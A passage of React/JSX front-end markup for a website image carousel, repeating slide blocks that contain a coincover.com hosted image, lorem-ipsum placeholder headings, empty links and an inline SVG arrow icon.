                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8269 22.7963C22.725 22.8982 22.6026 22.9798 22.4701 23.0307C22.3376 23.0817 22.1949 23.1021 22.0624 23.1123C21.777 23.1123 21.4915 22.99 21.2877 22.7861C21.0838 22.5822 20.9717 22.307 20.9717 22.0216C20.9819 21.8891 21.0023 21.7463 21.0532 21.6138C21.2265 21.2163 21.6343 20.9513 22.0522 20.9411C22.3376 20.9411 22.623 21.0634 22.8167 21.2571C23.0206 21.4609 23.1429 21.7463 23.1429 22.0318C23.1429 22.3172 23.0308 22.5924 22.8269 22.7963Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M22.8166 34.7123C22.6229 34.906 22.3375 35.0283 22.0521 35.0283C21.7667 35.0283 21.4813 34.906 21.2876 34.7123C21.0837 34.5085 20.9614 34.223 20.9716 33.9478C20.9716 33.377 21.4915 32.8571 22.0521 32.8673C22.3273 32.8571 22.6127 32.9794 22.8166 33.1833C23.0205 33.3872 23.1326 33.6624 23.1326 33.9478C23.1326 34.2332 23.0205 34.5085 22.8166 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M26.5678 29.432C26.1397 29.0039 26.1499 28.3209 26.5678 27.903C26.9858 27.4851 27.6687 27.4749 28.0969 27.903C28.5148 28.3209 28.5148 29.0141 28.0969 29.432C27.6789 29.8499 26.9858 29.8499 26.5678 29.432ZM23.9277 32.0721C23.4996 31.644 23.5098 30.961 23.9277 30.5431C24.3558 30.115 25.0286 30.115 25.4567 30.5431C25.8747 30.961 25.8849 31.644 25.4567 32.0721C25.0388 32.4901 24.3457 32.4901 23.9277 32.0721Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M30.737 26.7919C30.5331 26.9958 30.2579 27.1079 29.9724 27.1079C29.687 27.1079 29.4016 26.9856 29.2079 26.7919C29.0041 26.588 28.8817 26.3026 28.8919 26.0274C28.8919 25.4566 29.4016 24.9469 29.9724 24.9469C30.2477 24.9367 30.5331 25.059 30.737 25.2629C30.9408 25.4668 31.053 25.742 31.053 26.0274C31.053 26.3128 30.9408 26.588 30.737 26.7919Z"
                                                  fill="#3939EF"
                                                />
                                              </g>
                                              <defs>
                                                <clipPath id="clip0_430_39555">
                                                  <rect
                                                    width="18.9856"
                                                    height={19}
                                                    fill="white"
                                                    transform="translate(14.5701 27.9949) rotate(-45)"
                                                  />
                                                </clipPath>
                                              </defs>
                                            </svg>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slide">
                                      <div className="slide_inner">
                                        <div className="image">
                                          <img
                                            src="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg"
                                            alt="image"
                                            loading="lazy"
                                            width={1920}
                                            height={1280}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                            srcSet="https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=960&height=640&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 960w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=1920&height=1280&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 1920w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=2880&height=1920&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 2880w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=3840&height=2560&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 3840w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=4800&height=3200&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 4800w, https://www.coincover.com/hs-fs/hubfs/Coincover_April2025_CTA9/images/2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg?width=5760&height=3840&name=2c71d31963450c58fe599c40a68f1bf74c09b3de.jpg 5760w"
                                            sizes="(max-width: 1920px) 100vw, 1920px"
                                          />
                                        </div>
                                        <div className="description">
                                          <h6>
                                            <a href="">
                                              Horem ipsum dolor sit amet,
                                              consectetur adipiscing elit. Nunc
                                              vulputate libero et velit
                                              interdum, ac aliquet odio mattis.
                                            </a>
                                          </h6>
                                        </div>
                                        <div className="link">
                                          <a href="">
                                            <svg
                                              width={56}
                                              height={56}
                                              viewBox="0 0 56 56"
                                              fill="none"
                                              xmlns="http://www.w3.org/2000/svg"
                                            >
                                              <g clipPath="url(#clip0_430_39555)">
                                                <path
                                                  d="M34.7226 34.7123C34.6207 34.8143 34.5086 34.8856 34.3658 34.9468C34.2333 34.9977 34.1008 35.0283 33.9581 35.0283C33.6727 35.0283 33.3975 34.9162 33.1936 34.7123C33.0917 34.6104 33.0101 34.4881 32.9591 34.3556C32.9082 34.223 32.8776 34.0905 32.8776 33.9478C32.8776 33.377 33.3873 32.8673 33.9581 32.8673C34.2435 32.8673 34.5187 32.9794 34.7226 33.1833C34.9265 33.3872 35.0386 33.6624 35.0386 33.9478C35.0386 34.2332 34.9265 34.5085 34.7226 34.7123Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M33.9479 31.0631C33.3567 31.0631 32.8776 30.584 32.8674 29.9826C32.8776 29.3812 33.3567 28.9021 33.9479 28.9021C34.5493 28.8919 35.0386 29.3812 35.0284 29.9826C35.0284 30.2884 34.9061 30.5534 34.7124 30.7471C34.5085 30.951 34.2435 31.0733 33.9377 31.0733L33.9479 31.0631ZM33.9581 27.0978C33.3567 27.0877 32.8776 26.6086 32.8674 26.0071C32.8674 25.4159 33.3567 24.9266 33.9479 24.9266C34.5493 24.9368 35.0284 25.4159 35.0386 26.0173C35.0284 26.3129 34.9061 26.578 34.7124 26.7717C34.5187 26.9653 34.2537 27.0877 33.9581 27.0978Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M34.7124 22.8166C34.5187 23.0103 34.2333 23.1326 33.9479 23.1326C33.6625 23.1326 33.3771 23.0103 33.1834 22.8166C33.0815 22.7146 32.9999 22.5923 32.9489 22.4598C32.898 22.3273 32.8674 22.1948 32.8674 22.0521C32.8674 21.4812 33.3771 20.9716 33.9479 20.9716C34.2333 20.9716 34.5086 21.0837 34.7124 21.2876C34.9163 21.4914 35.0284 21.7666 35.0284 22.0521C35.0284 22.3375 34.9163 22.6127 34.7124 22.8166Z"
                                                  fill="#3939EF"
                                                />
                                                <path
                                                  d="M29.9826 23.1224C29.3914 23.1224 28.9021 22.6332 28.9021 22.0419C28.9123 21.4405 29.3914 20.9614 29.9826 20.9614C30.584 20.9512 31.0631 21.4507 31.0631 22.0419C31.0631 22.3477 30.9408 22.6128 30.7471 22.8064C30.5534 23.0001 30.2884 23.1224 29.9826 23.1224ZM26.0173 23.1122C25.4261 23.1122 24.947 22.6332 24.9368 22.0317C24.9368 21.4405 25.4261 20.9512 26.0173 20.9512C26.6188 20.9614 27.0978 21.4405 27.0978 22.0317C27.0978 22.3375 26.9755 22.6026 26.7818 22.7963C26.5882 22.9899 26.3231 23.1122 26.0173 23.1122Z"
                                                  fill="#3939EF"
                                                />
                                                <path
